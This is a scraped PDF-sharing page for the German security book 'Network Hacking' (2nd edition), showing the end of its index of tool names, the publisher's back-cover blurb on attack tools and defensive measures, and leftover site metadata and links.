Warwalking 259 Web Vulnerability Scanner 243 Z Webalizer 179 Zapass 359, 360 WEP 109, 258, 275, 289, 298, 302, 303, 307, zenmap 442, 443 308, 315, 316, 335 Zenmap 202 Wesside-NG 316 ZeuS 496 Whois-Abfrage 194 Zielsystem alive 198 Wi-Fi Protected Access 109 Zlob 375 Wikto 242, 243, 246, 247, 248, 249, 250, 251 Zombies 351 WinAPI 362 Zonealarm 356, 360, 364, 370, 381 WINcon 368, 369, 370 Zonelog Analyzer 547, 548 Windiff.exe 173 Zwei-Faktoren-Authentisierung 148, 150, Windows 7 327 173 WinEnum 485, 523, 524 USB-Blocker 571 USBDUMPER 2 94 USB-Token 148, 150, 152, 153, 173 User Account Control 567 Userland Rootkits 362\n60030-9 U1+U4:Layout 1\n31.03.2010\n16:13 Uhr\nSeite 1\nKnow-how ist blau.\nDr. Peter Kraft/Andreas Weyert Dr. Peter Kraft/Andreas Weyert\nAus dem Inhalt: \u2022 Die Werkzeuge f\u00fcr Angriff und Verteidigung\n2. aktualisierte Auflage\n\u2022 Keylogger \u2013 jeder Tastendruck wird registriert \u2022 Digitale Dietriche \u2013 Passwortknacker\n\u2022 Proxys und Socks \u2013 digitale Tarnkappen \u2022 PC-Fernsteuerungen: Remote-Access-Tools \u2022 Rootkits \u2013 die versteckte Bedrohung \u2022 Schn\u00fcffelnasen im Netz: Scanner und Sniffer\nWer seine Daten sch\u00fctzen will, muss die Einbruchswerkzeuge und die Methoden der potenziellen Diebe kennen. In dieser komplett \u00fcberarbeiteten Neuauflage des Beststellers \u201eNetwork Hacking\u201c beschreiben die Autoren Dr. Peter Kraft und Andreas Weyert die Tools und Vorgehensweisen der Datenpiraten und zeigen effektive Schutzma\u00dfnahmen. So erfahren Sie unter anderem, wie Hacker Malware mit Rootkits verbergen und wie Sie sich dagegen wehren, wie Sie Ihr Heimnetzwerk effektiv absichern und welche Sicherheitsrichtlinien in Unternehmen wirklich greifen.\n\uc530\n\uc530\n\uc530\nDie Tools der Cracker und Datenpiraten Nur wer wei\u00df, wie Hacking-Tools funktionieren, kann sich auch dagegen sch\u00fctzen. Minuti\u00f6s stellen die Autoren die gesamte Bandbreite der Werkzeuge vor und demonstrieren, wie Keylogger die Eingaben ahnungsloser Benutzer mitschneiden, Passwort-Cracker Zugangskennungen knacken, Remote-Access-Tools PCs in Zombies verwandeln und Rootkits Malware verstecken. Motive und Strategien der Angreifer Kein Datenpirat ist wie der andere. Ihre Motivation und ihre Methoden zu verstehen, ist ein wichtiger Schritt zum effektiven Selbstschutz. Die Autoren schildern in sieben Szenarien, wie Datendiebe vorgehen und welche Schw\u00e4chen der Netzwerkinfrastruktur sie daf\u00fcr ausnutzen. Denn wer physischen Zugang zu einem Rechner hat, geht anders vor als jemand, der ein WLAN hacken oder eine Denial-of-Service-Attacke starten will. Ausgehend vom jeweiligen Bedrohungsszenario, stellen die Autoren konkrete Abwehrstrategien vor. So befestigen Sie Ihr Netzwerk Die Autoren geben fundierte Empfehlungen f\u00fcr eine proaktive Sicherheitsstrategie. Viele Schritte sind sogar kostenlos m\u00f6glich, so etwa die \u00dcberpr\u00fcfung des Sicherheitsstatus oder das Abschalten nicht ben\u00f6tigter Dienste auf Windows-PCs. Dar\u00fcber hinaus erhalten Sie leicht nachvollziehbare Ratschl\u00e4ge f\u00fcr die Auswahl von geeigneten Security-Tools und f\u00fcr das Erstellen wirksamer Sicherheitsrichtlinien in Unternehmen.\n\u2022 Angriffstools f\u00fcr drahtlose Netze \u2022 Die Angreifer und ihre Motive \u2022 Szenario I: Geklaute Daten \u2022 Szenario II: Verwanzte PCs \u2022 Szenario III: Angriffe durch Portscanner & Co. \u2022 Szenario IV: Defacements und D(D)oS-Angriffe \u2022 Szenario V: Gehacktes WLAN \u2022 Szenario VI: Malware-Attacke aus dem Internet \u2022 Szenario VII: Angriffe von innen \u2022 Wirkungsvolle Vorsorgestrategien bei privaten Netzwerken \u2022 Effektive Schutzma\u00dfnahmen f\u00fcr Firmennetze\n\u00dcber die Autoren: Dr. Peter Kraft ist Gesch\u00e4ftsf\u00fchrer von synTeam Dr. Kraft & Partner. Seit mehr als zehn Jahren ber\u00e4t er Kunden in Fragen der Organisationsentwicklung und -optimierung. Er ist Autor mehrerer erfolgreicher B\u00fccher zum Thema IT-Sicherheit und NLP. Andreas Weyert ist Security Consultant der buw consulting GmbH. Als Spezialist f\u00fcr die Themen Security Management, Informationssicherheit, PenetrationTesting und Datenschutz ist er vom BSI lizenzierter IT-Grundschutz-Auditor und zertifizierter Teamleiter f\u00fcr ISO-27001Audits.\nAuf www.buch.cd Feature-Listen und Bedienparameter der im Buch vorgestellten Hacking-Tools.\n49,95 EUR [D] ISBN 978-3-645-60030-9\nBesuchen Sie unsere Website\nwww.franzis.de\nNetwork Hacking\nProfessionelle Angriffs- und Verteidigungstechniken gegen Hacker und Datendiebe\n\u2022 Die Horchposten: Portscanner\nKraft Weyert\nNetwork Hacking\nProfessionelle Angriffs- und Verteidigungstechniken gegen Hacker und Datendiebe\n2. aktualisierte Auflage\nNetwork Hacking Professionelle Angriffs - und Verteidigungstechniken gegen Hacker und Datendiebe > Tools f\u00fcr Angriff und Verteidigung \u2013 vom Keylogger bis zum Rootkit > Vorbeugung gegen Malware-Attacken aus dem Internet > Effektive Schutzma\u00dfnahmen f\u00fcr Privat- und Firmennetze", "language": null, "image": "https://kupdf.net/theme/img/logo-kupdf-square.png", "pagetype": "article", "links": ["https://kupdf.net/categories", "https://kupdf.net/top-documents", "https://kupdf.net/", "#sidebar", "https://kupdf.net/login", "https://kupdf.net/register", "https://kupdf.net/upload", "https://kupdf.net/categories", "https://kupdf.net/top-documents", "https://kupdf.net/login", "https://kupdf.net/register", "#sidebar-close", "https://kupdf.net/", "https://kupdf.net/download/networkhacking-professionelleangriffs-undverteidigungstechnikengegenhackerunddatendiebeedition2_5af361e4e2b6f5fc6c325245_pdf", "https://kupdf.net/category/Operating System", "https://kupdf.net/category/Computer Network Security", "https://kupdf.net/category/Computer Security Exploits", "https://kupdf.net/category/Computing", "https://kupdf.net/category/Technology", "https://www.facebook.com/sharer/sharer.php?u=https://kupdf.net/download/networkhacking-professionelleangriffs-undverteidigungstechnikengegenhackerunddatendiebeedition2_5af361e4e2b6f5fc6c325245_pdf", "#embed", "#", "#report", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "/cdn-cgi/l/email-protection", "#", "#modals", "#modals", "#modals", "#modals", "https://kupdf.net/about", "https://kupdf.net/terms", "https://kupdf.net/privacy", "https://kupdf.net/copyright", "https://kupdf.net/contact", "#", "#", "#", "#", "#", "#tab-donate", "#tab-share", "https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=tyquaviousbredeweg%40outlook.dk&lc=DO&item_name=kupdf\u00a4cy_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted", "https://www.facebook.com/sharer/sharer.php?u=https://kupdf.net/&t=", "https://plus.google.com/share?url=https://kupdf.net/", "https://twitter.com/intent/tweet?source=https://kupdf.net/&text=:%20https://kupdf.net/&via=https://kupdf.net/", "https://pinterest.com/pin/create/button/?url=https://kupdf.net/&description=", "http://www.linkedin.com/shareArticle?mini=true&url=https://kupdf.net/&title=&summary=&source=https://kupdf.net/", "/cdn-cgi/l/email-protection#78470b0d1a121d1b0c455e191508431a171c0145425d4a48100c0c080b425757130d081c1e56161d0c57", "#"]}